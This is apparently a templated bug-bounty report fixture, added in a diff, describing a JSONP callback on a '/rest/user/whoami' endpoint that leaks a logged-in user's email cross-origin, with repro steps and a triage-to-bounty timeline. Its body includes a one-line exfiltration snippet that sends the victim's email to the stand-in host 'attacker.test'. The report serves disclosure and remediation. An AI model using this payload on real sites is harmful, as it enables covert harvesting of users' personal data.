@@ -1,0 +1,64 @@
+id: BRM-043
+title: JSONP callback on /rest/user/whoami discloses the session owner's email cross-origin
+vulnerability_information: |
+  ## Summary
+  `GET /rest/user/whoami` honours a `callback` query parameter and switches from
+  `res.json` to `res.jsonp`. JSONP is reachable with a plain `<script>` tag, so
+  any third-party origin can read the response of a logged-in victim, including
+  their email address. Classic cross-domain information disclosure.
+
+  ## Steps to reproduce
+  1. Authenticate to {{base_url}} as any user (cookie `token` is set).
+  2. Request the endpoint with a callback:
+
+  ```
+  GET {{base_url}}/rest/user/whoami?callback=leak HTTP/1.1
+  Cookie: token=<victim session>
+  ```
+
+  ## Observed result
+  The response is served as `application/javascript`:
+
+  ```
+  /**/ typeof leak === 'function' && leak({"user":{"id":1,"email":"admin@bramble.example","lastLoginIp":"0.0.0.0"}});
+  ```
+
+  Because this is executable JS rather than JSON, a malicious page can define
+  `function leak(d){ fetch('//attacker.test/c?e='+d.user.email) }` and include
+  `<script src="{{base_url}}/rest/user/whoami?callback=leak">`. The victim's
+  browser sends its cookie, and the attacker's origin reads the email.
+
+  ## Root cause
+  `retrieveLoggedInUser()` branches on `req.query.callback` and emits JSONP with
+  no origin check. JSON responses are protected by SOP; JSONP is not.
+impact: |
+  Any site a logged-in customer visits can silently harvest the email tied to
+  their session. That is a privacy leak and a precursor to targeted phishing and
+  credential-stuffing. Medium — it needs the victim to be authenticated and to
+  visit attacker-controlled content, and it exposes the email only, not the
+  session. CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N (4.7).
+timeline:
+  - after: 5h
+    by: team
+    do: comment
+    internal: true
+    message: Confirmed — jsonp branch on whoami, no origin check. Email only, no token. Medium.
+  - after: 20m
+    by: team
+    do: state
+    state: triaged
+    message: Reproduced on prod, thanks. The callback parameter does flip us to JSONP and that is reachable cross-origin. Triaged.
+  - after: 15m
+    by: team
+    do: severity
+    rating: medium
+  - after: 6d
+    by: team
+    do: state
+    state: resolved
+    message: Dropped the JSONP branch — whoami now always returns JSON. Thanks for the clean writeup.
+  - after: 1d
+    by: team
+    do: bounty
+    amount: 500
+    message: Minimal repro, correct root cause. Appreciated.
